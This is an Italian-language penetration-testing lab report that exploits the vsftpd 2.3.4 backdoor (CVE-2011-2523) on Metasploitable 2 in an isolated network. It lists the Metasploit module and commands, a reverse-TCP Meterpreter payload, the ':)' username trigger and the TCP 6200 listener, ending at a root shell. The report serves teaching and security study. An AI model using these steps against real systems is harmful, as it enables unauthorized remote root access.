**Disclaimer Educativo**: Questa documentazione è redatta esclusivamente a scopo informativo, didattico e di ricerca. 
Tutte le attività tecniche descritte sono state condotte all'interno di un laboratorio virtualizzato isolato (host-only network), 
con l'unico obiettivo di studiare le vulnerabilità dei sistemi informatici, comprendere le tecniche di penetration testing e implementare adeguate contromisure difensive.

Il presente report documenta l'analisi e lo sfruttamento di una nota vulnerabilità critica (CVE-2011-2523) presente nel server FTP vsftpd versione 2.3.4.
L'obiettivo del test è osservare il comportamento di una macchina virtuale vulnerabile di fronte a un attacco di Remote Code Execution (RCE) e analizzare le fasi successive di post-exploitation.

Ambiente di Test: VirtualBox con rete isolata (Host-only)

**Host Attaccante**: Kali Linux (Ip_Kali)

**Host Target**: Metasploitable 2 (Ip_Metasploitable)

**Fase 1: Configurazione del Modulo ed Analisi dei Parametri (show options)**
Dopo l'avvio del framework Metasploit eseguito con il comando msfconsole, è stato caricato il modulo exploit specifico per la backdoor inserita nel codice sorgente della versione 2.3.4 di vsftpd (exploit/unix/ftp/vsftpd_234_backdoor).

Prima dell'esecuzione, sono stati definiti i parametri fondamentali richiesti dal modulo e dal payload associato (cmd/unix/http/x86/meterpreter_reverse_tcp):

**RHOSTS**: Specifica l'indirizzo IP del target da sottoporre a test.

**RPORT**: Imposta la porta di ascolto del servizio FTP sul target (standard TCP 21).

**LHOST**: Definisce l'indirizzo IP della macchina attaccante Kali su cui ricevere la connessione di ritorno detta reverse shell.

I comandi eseguiti successivamente sono i seguenti:

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS Ip_Metasploitable
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST Ip_Kali

**Fase 2: Exploitation e Apertura della Sessione**
Una volta validati i parametri, l'esecuzione del comando "exploit" o in alternativa "run" avvia la sequenza di attacco.

Analisi del flusso di esecuzione:
Ricognizione preliminare: Il modulo esegue un controllo automatico del banner del servizio, confermando la presenza della stringa vulnerabile 220 (vsFTPd 2.3.4)

Innesco della Backdoor: L'exploit si connette al server FTP e invia una stringa di autenticazione il cui nome utente termina con la sequenza speciale :). 
Questa condizione attiva una backdoor nel codice sorgente compromesso, aprendo in modo anomalo una connessione di ascolto sulla porta TCP 6200 del target

Gestione della Reverse TCP: Il gestore di handler configurato su Kali accoglie la connessione di ritorno stabilendo una sessione Meterpreter attiva e interattiva.

**Fase 3: Post-Exploitation ed Analisi del File System**
Stabilita la sessione Meterpreter con privilegi elevati (root), è stata avviata la fase di ricognizione interna.
Al momento attuale è possibile eseguire comandi come "ls" e "ls -lah" per esplorare i file all'interno della macchina vittima.
